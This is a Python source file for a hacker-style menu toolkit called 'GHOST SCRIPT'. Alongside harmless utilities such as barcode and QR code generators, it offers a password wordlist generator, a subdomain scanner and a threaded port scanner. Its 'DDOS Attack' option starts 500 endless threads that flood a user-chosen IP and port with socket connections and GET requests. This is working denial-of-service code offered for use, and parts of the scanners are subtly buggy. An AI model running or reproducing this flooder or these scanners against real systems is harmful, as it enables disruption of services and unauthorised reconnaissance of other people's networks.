import os, time
# from colorama import Fore, Style
from tqdm import *
from pyfiglet import Figlet
import requests
import random
import pyqrcode
from barcode import EAN13
from queue import Queue
import socket
import threading
from barcode.writer import ImageWriter
from pip._vendor.distlib.compat import raw_input
import pyfiglet
import phonenumbers
from phonenumbers import carrier
from phonenumbers import geocoder
from tabulate import tabulate
from datetime import datetime

try:

    os.system('clear')
    result = pyfiglet.figlet_format('GHOST', font="5lineoblique")
    print(result, "\n", "SCRIPT".center(50, "-"),"\n")

    # Menu
    options = (" 1 - My IP Address \n 2 - Password Generator \n 3 - Wordlist Generator \n 4 - Barcode Generator \n 5 - QRCODE Generator \n 6 - Phone Number Info \n 7 - Subdomain Scanner \n 8 - Port Scanner \n 9 - DDOS Attack     \n 99 - To Exit\n")
    print(options)

    # Takes user input for menu
    select = int(input(">> "))

    match select:

        # My IP Address
        case 1:
            def loading():
                for _ in tqdm(range(100), desc='Loading....', ascii=False, ncols=75):
                    time.sleep(0.01)
                print("LOADING DONE!")

            def font(text):
                cool_text = Figlet(font='slant')
                return str(cool_text.renderText(text))

            def window_size(columns=750, height=30):
                os.system("cls")
                #It changes commandline size
                os.system(f"mode con: cols={columns} lines={height}")

            if  __name__ == "__main__":
                window_size(80,20)
                print(font("Find my IP"))
                loading()

                hostname = socket.gethostname()
                IPAddr = socket.gethostbyname(hostname)
                print("\nYOUR DEVICE            : ".upper()+hostname)
                print("YOUR IP ADDRESS    : ".upper()+IPAddr)
                raw_input("\nPRESS ENTER TO EXIT")

        # Password Generation
        case 2:
            def loading():
                for _ in tqdm(range(100), desc='LOADING....', ascii=False, ncols=75):
                    time.sleep(0.01)
                print('LETS MOVE!')

            def font(text):
                cool_text = Figlet(font='slant')
                return str(cool_text.renderText(text))

            def window_size(columns=750, height=30):
                os.system("cls")
                os.system(f"mode con: cols={columns} lines={height}")
                
            if __name__ == "__main__":
                window_size(80,20)
                print(font("PASSWORD GENERATOR"))
                loading()

                length = int(input("\nEnter password length : ".upper()))

                def get_random_string(length):
                    lower="abcdefghijklmnopqrstuvwxyz"
                    upper='ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                    numbers="0123456789"
                    symbols = "@#$%^&*(}){:/.,;\\`~+-="
                    all =  numbers+upper+lower+symbols

                    generated_pass = []
                    print("\nGenerated password of length".upper(), length, "is : \n")

                    for i in range(0,5):
                        password = "".join(random.sample(all, length))
                        if password not in generated_pass:
                            print(f"{i+1}. {password}")
                        else:
                            continue
                
                # calling password generation engine
                try:
                    get_random_string(length)
                except KeyboardInterrupt:
                    print("\n Program Stopped by the user.".title())

                raw_input("press enter to exit".upper())

        # Wordlist Generator
        case 3:
            def loading():
                for _ in tqdm(range(100), desc='loading....'.upper(), ascii=False, ncols=75):
                    time.sleep(0.01)
                print('Lets Create!'.upper())
            
            def font(text):
                cool_text = Figlet(font="slant")
                return str(cool_text.renderText(text))

            def window_size(columns=750, height=30):
                os.system("cls")
                os.system(f"mode con: cols={columns} lines={height}")
            
            if __name__ == "__main__":
                window_size(80,20)
                print(font("Wordlist Generator".upper()))
                loading()

                
                file_created_on = datetime.now()
                def write_file(password):
                    """
                    This function write combinations on wordlist file.
                    """
                    file_name = f"wordlists/{file_created_on.strftime('%H-%M-%d-%m-%Y')}.txt"
                    if not os.path.isfile(file_name):
                        wl_file = open(file_name, "w")
                        wl_file.write(f"\n{password}")
                        wl_file.close()
                    else:
                        wl_file = open(file_name, "a")
                        wl_file.write(f"\n{password}")
                        wl_file.close()

                lower="abcdefghijklmnopqrstuvwxyz"
                upper='ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                numbers="0123456789"
                symbols = "@#$%^&*(}){:/.,;\\`~+-="

                file_name_ = f"wordlists/{file_created_on.strftime('%H-%M-%d-%m-%Y')}.txt"
                pass_length = int(input("\nEnter Password length : ".upper()))
                pass_elements = []

                # Take Specific charater from the user for the custom wordlist
                if int(input('\nGenerate From : \n1. Random Characters\n2. Specific Character\n\n>> ')) == 2:
                    pass_elements.append(input("Specify Characters [like : loop1234&F] ->  "))
                
                # Generates Random Password Wordlists
                else:
                    if input("\nInclude Lower Case Alphabats (y/n) : ") == "y":
                            pass_elements.append(lower)
                        
                    if input("\nInclude Upper Case Alphabats (y/n) : ") == "y":
                            pass_elements.append(upper)
                        
                    if input("\nInclude Numbers (y/n) : ") == "y":
                            pass_elements.append(numbers)
                        
                    if input("\nInclude Special Characters (y/n) : ") == "y":
                            pass_elements.append(symbols)
                    
                print("\n") # Break Line

                def wordlidts_generator(include_elements, length):
                        """
                        This function generates wordlist of the give length.
                        """
                        generated_passwords = []
                        elements = ''.join(include_elements)

                        for _ in tqdm(range(0,len(elements)**length), desc='Generating....'.upper(), ascii=False, ncols=75):
                            passwords = ''.join(random.sample(elements, length))    
                            
                            if passwords not in generated_passwords:
                                # print(passwords)
                                generated_passwords.append(passwords)
                                write_file(passwords)
                            else:
                                continue
                        print('\nWordlist created Successfully.\n')
                        print(f'\nPath : {file_name_}\n')
                    
                wordlidts_generator(pass_elements, pass_length)

                raw_input("press enter to exit".upper())

        # Barcode Generator
        case 4:
            def loading():
                for _ in tqdm(range(100), desc='loading....'.upper(), ascii=False, ncols=75):
                    time.sleep(0.01)
                print('Lets Create!'.upper())
            
            def font(text):
                cool_text = Figlet(font="slant")
                return str(cool_text.renderText(text))

            def window_size(columns=750, height=30):
                os.system("cls")
                os.system(f"mode con: cols={columns} lines={height}")
            
            if __name__ == "__main__":
                window_size(80,20)
                print(font("Barcode Generator".upper()))
                loading()

                print("\n* generated barcode will be stored as png file in the Images/barcode folder.".upper())

                def generator(number):
                    #TODO: Add multiple barcode generation feature
                    """
                    This function generates Barcode Generator
                    """
                    my_code = EAN13(number, writer=ImageWriter())
                    
                    if not os.path.isfile("images/barcode/bar_code.png"):
                        my_code.save("images/barcode/bar_code")
                    else:
                        my_code.save("images/barcode/bar_code-1")

                    print('\nBarcode Generated Successfully.\n')
                    

                number = input("\nEnter 12 digit number to generate barcode : ".upper())

                if len(number) == 12:    
                    generator(number)
                else:
                    print('\n* Number should not be more or less than 12.\n')
                    time.sleep(2)

                raw_input("press enter to exit".upper())

        
        # QR Code Generator
        case 5:
            def loading():
                for _ in tqdm(range(100), desc='loading....'.upper(), ascii=False, ncols=75):
                    time.sleep(0.01)
                print('Lets Create!'.upper())
            
            def font(text):
                cool_text = Figlet(font="slant")
                return str(cool_text.renderText(text))

            def window_size(columns=750, height=30):
                os.system("cls")
                os.system(f"mode con: cols={columns} lines={height}")
            
            if __name__ == "__main__":
                window_size(80,20)
                print(font("QR Code Generator".upper()))
                loading()

                print("\n* Generated QR Code will be saved as 'qrcode.png' file inside the Images/qrcode Folder.".upper())

                link = input("\nEnter the link to create the QR code : ".upper())
                url = pyqrcode.create(link)
                url.svg("images/qrcode/svg/qrcode.svg", scale=8)
                url.png("images/qrcode/qrcode.png", scale=6)

                raw_input("Press enter to exit".upper())


        # Phone Number Info
        case 6:
            def loading():
                for _ in tqdm(range(100), desc='loading....'.upper(), ascii=False, ncols=75):
                    time.sleep(0.01)
                print('Lets Find Out!'.upper())
            
            def font(text):
                cool_text = Figlet(font="slant")
                return str(cool_text.renderText(text))

            def window_size(columns=750, height=30):
                os.system("cls")
                os.system(f"mode con: cols={columns} lines={height}")
            
            if __name__ == "__main__":
                window_size(80,20)
                print(font("Phone Number Scanner".upper()))
                loading()

                def num_scanner(phn_num):
                    number = phonenumbers.parse(phn_num)
                    desc = geocoder.description_for_number(number, 'en')
                    supplier = carrier.name_for_number(number,'en')
                    info = [["Country", "Carrier"], 
                            [desc, supplier]]

                    data = str(tabulate(info, headers="firstrow", tablefmt="github"))
                    return data
                
                phn_num_ = input("\nEnter Phone number with country code [+91]: ".upper())
                print("\n") # Line Break
                print(num_scanner(phn_num_))
                print("\n") # Line Break

                raw_input("press enter to exit".upper())


        # Subdomain Scanner
        case 7:
            def loading():
                for _ in tqdm(range(100), desc='loading....'.upper(), ascii=False, ncols=75):
                    time.sleep(0.01)
                print('Lets Create!'.upper())
            
            def font(text):
                cool_text = Figlet(font="slant")
                return str(cool_text.renderText(text))

            def window_size(columns=750, height=30):
                os.system("cls")
                os.system(f"mode con: cols={columns} lines={height}")
            
            if __name__ == "__main__":
                window_size(80,20)
                print(font("SUbdomain scanner".upper()))
                loading()
                
                file = open("subdomains.txt")
                content = file.read()
                subdomains = content.splitlines()

                print("\n It takes time according to the domain".upper())
                print(f" Using default added wordlist with {len(content)} words".upper())

                domain = input('\nEnter the domain to scan : '.upper())
                gotted = []

                print("\n")
                try :
                    for n in tqdm(range(len(content)), desc="processing....".upper(), ascii=False, ncols=75):
                            
                            url = f"https://{subdomains[n]}.{domain}"
                            
                            try :
                                requests.get(url)
                            except requests.ConnectionError:
                                pass
                            else:
                                gotted.append(url)
                                continue
                except KeyboardInterrupt:
                    for subdomains in gotted:
                        print("\n[+] Discovered subdomains : ",subdomains)

                raw_input("\npress enter to exit".upper())


        # Port Scanner
        case 8:
            def loading():
                for _ in tqdm(range(100), desc='loading....'.upper(), ascii=False, ncols=75):
                    time.sleep(0.01)
                print('Lets Scan!'.upper())
            
            def font(text):
                cool_text = Figlet(font="slant")
                return str(cool_text.renderText(text))

            def window_size(columns=750, height=30):
                os.system("cls")
                os.system(f"mode con: cols={columns} lines={height}")
            
            if __name__ == "__main__":
                window_size(80,20)
                print(font("Port Scanner".upper()))
                loading()

                print("\nKeep some patience, \nit takes time according to the open ports and provided ip".upper())

                target = input("\nEnter the ip to scan : ".upper())
                mode_ = int(input("Scan Mode [1, 2, 3, 4] : "))

                queue = Queue()
                open_ports = []

                def portscan(port):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((str(target), port))
                        # print(1)
                        return True
                    except : 
                        # print(0)cls
                        return False

                def get_ports(mode):
                    if mode == 1:
                        for port in range(1,1025):
                            queue.put(port)
                    
                    elif mode == 2:
                        for port in range(1, 49152):
                            queue.put(port)
                    
                    elif mode == 3:
                        port =  [20,21,443,80,43,53,22]
                        for ports in port:
                            queue.put(ports)
                    
                    elif mode == 4:
                        ports = input("\nEnter ports [separated by blank space] : ".upper())
                        ports.split()
                        ports = list(map(int, ports))
                        for port in ports:
                            queue.put(port)
                
                def worker():
                    while not queue.empty():
                        port = queue.get()

                        if portscan(port):
                            print(f"\nPort {port}/TCP is open!")
                            open_ports.append(port)  
                    
                
                def run_scanner(threads, mode):
                    get_ports(mode)
                    thread_list = []

                    for t in range(threads):
                        thread = threading.Thread(target=worker)
                        thread_list.append(thread)

                    for thread in thread_list:
                        thread.start()
                    

                run_scanner(100, mode_)
                    

                
        # DDOS Attack
        case 9:
            def loading():
                for _ in tqdm(range(100), desc='loading....'.upper(), ascii=False, ncols=75):
                    time.sleep(0.01)
                print('Lets Create!'.upper())
            
            def font(text):
                cool_text = Figlet(font="slant")
                return str(cool_text.renderText(text))

            def window_size(columns=750, height=30):
                os.system("cls")
                os.system(f"mode con: cols={columns} lines={height}")
            
            if __name__ == "__main__":
                window_size(80,20)
                print(font("DDOS Attack".upper()))
                loading()

                target = input("Enter the ip address : ".upper())
                port = int(input("Enter the port : ".upper()))

                fake_ip = "181.4.20.196"
                already_connected = 0

                def attack():
                    while True:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((str(target), port))
                        sock.sendto(("GET /"+target+"HTTP/1.1\r\n").encode('ascii'), (target, port))
                        sock.sendto(("GET /"+fake_ip+"HTTP/1.1\r\n").encode('ascii'), (target, port))
                        sock.close()

                        global already_connected
                        already_connected += 1
                    
                        if already_connected % 500 == 0:
                            print("Already Connected".upper())

                for i in range(500):
                    thread = threading.Thread(target=attack)
                    thread.start()

        case 99:
            quit()

        # elif select == 10:
        #     def loading():
        #         for _ in tqdm(range(100), desc='loading....'.upper(), ascii=False, ncols=75):
        #             time.sleep(0.01)
        #         print('Lets Create!'.upper())
            
        #     def font(text):
        #         cool_text = Figlet(font="slant")
        #         return str(cool_text.renderText(text))

        #     def window_size(columns=750, height=30):
        #         os.system("cls")
        #         os.system(f"mode con: cols={columns} lines={height}")
            
        #     if __name__ == "__main__":
        #         window_size(80,20)
        #         print(font("admin pannel finder".upper()))
        #         loading()


except KeyboardInterrupt:
    print("\nProgram was stopped.".upper())        

                